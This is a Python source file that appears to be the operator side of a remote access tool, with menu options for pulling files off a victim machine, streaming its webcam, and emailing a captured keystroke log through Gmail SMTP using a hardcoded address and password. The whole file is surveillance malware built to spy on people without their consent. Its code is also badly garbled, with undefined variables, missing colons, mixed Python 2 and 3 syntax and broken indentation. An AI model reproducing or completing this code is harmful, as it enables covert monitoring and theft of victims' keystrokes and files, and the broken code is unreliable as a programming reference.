import socket, os, time
import cv2, numpy,  readline, sys
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders

from Crypto import Random
from Crypto.Cipher import AES

soc= socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port)) 

def main():
	
	 os.system('cls')
	 while True:
	 menu()
	print()command = input(str("command >> "))
	 
	if command == '1':
		fileDirectory()
	
	elif command == '2'
		webCam()
	
	elif command == '3'
		kelogger()
	
	else:
        	print("Invalid Command")

   	 print("")	

def menu():
	print 'Filedirectory'
	print 'Webcam'
	print 'KeyLogger'
	



def fileDirectory(connection, command):
	connection.send(command.encode())  
        files = conn.recv()  
        files = files.decode()  
        print("Command output:", files)
	filePath = input(str(" please enter the files path: "))
        fileName = input(str("please enter name of file with extension: "))
        newFile = open(fileName, "wb")
        newFile.write(file)
        newFile.close()
        print("Downloaded and saved")


def webCam(connection, command, ip_address):
    connection.send(command)
    while True:
        
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
        soc.listen(1) #listen for one connection
        conn, addr = soc.accept() 
        
        message = [] #variable to hold the data
        while True:
            d = conn.recv(1024 * 1024) 
            if not d: break
            message.append(d)
        data = ''.join(message) 
        numpy_data = numpy.fromstring(data, numpy.uint8)  format
         
        decimg = cv2.imdecode(numpy_data, 1) 
        cv2.imshow("Remote WebCam", decimg) 
         
        if cv2.waitKey(5) == 27: break 
         
    cv2.destroyAllWindows()


def kelogger():

	  toaddr = 'testkey.py@gmail.com'    
  	  me = 'testkey.py@gmail.com' 
   	  subject = "Logs"
	
  	  msg = MIMEMultipart()
   	  msg['Subject'] = subject
 	  msg['From'] = me
   	  msg['To'] = toaddr
  	  msg.preamble = "test " 
   	  #msg.attach(MIMEText(text))

   	 part = MIMEBase('application', "octet-stream")
   	 part.set_payload(open("key_log.txt", "rb").read())
    	 encoders.encode_base64(part)
    	 part.add_header('Content-Disposition', 'attachment; filename="key_log.txt"')
   	 msg.attach(part)

  	  try:
    	   s = smtplib.SMTP('smtp.gmail.com', 587)
       	   s.ehlo()
     	   s.starttls()
    	   s.ehlo()
      	   s.login(user = 'testkey.py@gmail.com', password = 'P@ssword@!23')
     	   #s.send_message(msg)
     	   s.sendmail(me, toaddr, msg.as_string())
           s.quit()
     	   #except:
    	   #print ("Error: unable to send email")
   	   except SMTPException as error:
           print ("Error")



